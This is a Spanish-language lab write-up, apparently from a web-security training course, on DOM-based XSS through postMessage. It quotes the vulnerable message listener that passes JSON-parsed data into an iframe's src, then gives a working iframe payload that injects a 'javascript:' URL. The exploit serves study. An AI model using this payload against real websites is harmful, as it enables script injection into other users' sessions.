# XSS DOM con Web Messages y 'JSON.parce'

Tags: #XSS-DOM #JavaScript 

```bash
En este lab se aprovecha una vulnerabilidad de tipo DOM XSS donde la aplicación recibe mensajes mediante postMessage, los interpreta como JSON con JSON.parse y, según su contenido, modifica dinámicamente el atributo src de un iframe interno.

- JSON.parce: Es un método que se utiliza para convertir una cadena JSON en un objeto JavaScript. Básicamente, toma una cadena de texto que sigue el formato JSON y la transforma en un objeto que puedes manipular y acceder a sus propiedades desntro de tu código JavaScript.
```

```javascript
// Código donde se acontece la inyección 

	<script>
		window.addEventListener('message', function(e) {
			var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
			document.body.appendChild(iframe);
			try {
				d = JSON.parse(e.data);
			} catch(e) {
				return;
			}
			switch(d.type) {
				case "page-load":
					ACMEplayer.element.scrollIntoView();
					break;
				case "load-channel":
					ACMEplayer.element.src = d.url;   // Inyección JavaScript 
					break;
				case "player-height-changed":
					ACMEplayer.element.style.width = d.width + "px";
					ACMEplayer.element.style.height = d.height + "px";
					break;
			}
		}, false);
	</script>
```

```javascript 
// La data debe de ser transmitida por JSON escapando las " con un \ para evitar que colapse

<iframe src="https://web.com/" onload='this.contentWindow.postMessage("{\"type\": \"load-channel\", \"url\": \"javascript:alert(0)\"}", "*");'></iframe>


Notas:
	1. Colocar la función print(0) en lugar de alert(0)
```